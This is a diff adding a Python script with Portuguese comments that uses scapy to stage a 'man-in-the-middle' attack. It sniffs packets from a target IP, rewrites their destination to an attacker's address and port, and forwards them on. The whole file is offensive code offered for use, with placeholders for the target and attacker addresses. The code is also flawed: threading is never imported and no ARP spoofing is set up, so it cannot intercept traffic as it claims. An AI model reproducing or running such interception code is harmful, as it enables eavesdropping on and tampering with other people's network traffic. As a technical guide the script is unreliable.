@@ -1,0 +1,67 @@
+import requests
+import sys
+from scapy.all import *
+
+def ataque_man_in_the_middle(alvo):
+    # Captura os pacotes da vítima e do servidor
+    def interceptar_pacote(pacote):
+        if pacote.haslayer(IP) and pacote.haslayer(TCP) and pacote[IP].src == alvo:
+            pacote[IP].dst = 'endereço_do_atacante'  # Coloque o seu endereço IP aqui
+            pacote[TCP].dport = porta_atacante  # Coloque a porta que deseja utilizar
+            send(pacote)
+
+    # Redireciona os pacotes modificados para o destino original
+    def redirecionar_pacote(pacote):
+        if pacote.haslayer(IP) and pacote.haslayer(TCP) and pacote[IP].dst == 'endereço_do_atacante':
+            pacote[IP].dst = 'endereço_do_destino_original'  # Coloque o endereço IP do destino original aqui
+            pacote[TCP].dport = porta_destino_original  # Coloque a porta do destino original
+            send(pacote)
+
+    # Inicia o ataque
+    def iniciar_ataque():
+        try:
+            # Configura a interface de rede
+            interface = 'sua_interface_de_rede'  # Coloque a sua interface de rede
+
+            # Configura o filtro de captura
+            filtro = f"src host {alvo} and dst port {porta_atacante}"  # Coloque a porta do alvo
+
+            # Inicia a captura de pacotes
+            sniff(iface=interface, filter=filtro, prn=interceptar_pacote)
+        except KeyboardInterrupt:
+            print("Ataque interrompido.")
+            sys.exit(0)
+
+    # Inicia o redirecionamento dos pacotes
+    def iniciar_redirecionamento():
+        try:
+            # Configura a interface de rede
+            interface = 'sua_interface_de_rede'  # Coloque a sua interface de rede
+
+            # Configura o filtro de captura
+            filtro = f"src host {alvo} and dst host endereço_do_atacante"  # Coloque o endereço IP do atacante
+
+            # Inicia a captura de pacotes
+            sniff(iface=interface, filter=filtro, prn=redirecionar_pacote)
+        except KeyboardInterrupt:
+            print("Redirecionamento interrompido.")
+            sys.exit(0)
+
+    # Inicia o ataque e redirecionamento em threads separadas
+    def iniciar_ataque_man_in_the_middle():
+        thread_ataque = threading.Thread(target=iniciar_ataque)
+        thread_redirecionamento = threading.Thread(target=iniciar_redirecionamento)
+
+        thread_ataque.start()
+        thread_redirecionamento.start()
+
+    # Chama a função para iniciar o ataque de Man-in-the-Middle
+    iniciar_ataque_man_in_the_middle()
+
+
+# Exemplo de uso
+alvo = 'endereço_do_alvo'  # Coloque o endereço IP do alvo
+porta_atacante = 8080  # Coloque a porta que deseja utilizar
+porta_destino_original = 80  # Coloque a porta do destino original
+
+ataque_man_in_the_middle(alvo)
